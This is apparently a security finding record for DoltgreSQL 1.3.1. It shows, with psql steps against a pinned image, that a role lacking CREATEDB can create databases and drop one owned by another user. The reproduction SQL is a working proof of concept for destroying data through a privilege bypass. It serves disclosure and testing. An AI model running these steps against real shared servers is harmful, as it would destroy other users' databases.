# DoltgreSQL 1.3.1: a role without CREATEDB can create and drop any database

Record: `knowledge/tools/doltgresql-1-3-1.md`.

**Steps** (psql against `dolthub/doltgresql:1.3.1`, digest `sha256:6c85cb1f35beabf47f094336a420255130b841b1645f36d79ef046276af36851`):

```sql
-- as postgres
CREATE DATABASE victim;
CREATE ROLE demo LOGIN PASSWORD 'demo';
SELECT rolsuper, rolcreatedb, rolcreaterole FROM pg_roles WHERE rolname = 'demo';   -- f | f | f
ALTER ROLE demo NOCREATEDB;
-- as demo, connected to postgres
CREATE DATABASE demo_made;   -- CREATE DATABASE
DROP DATABASE victim;        -- DROP DATABASE
```

**Result:** both succeed, and `victim`, which `postgres` created, is gone. The same role can call `dolt_branch(...)`. Table privileges are enforced: `demo` is refused `CREATE TABLE` in `public` and `SELECT`, `INSERT` and `DROP TABLE` on a table it has no grant on. Expected, as in PostgreSQL: `CREATE DATABASE` refused without `CREATEDB`, and `DROP DATABASE` refused to anyone but the owner or a superuser.

**Why it matters:** a read-only account cannot be offered on a shared DoltgreSQL server, since it can drop every database.
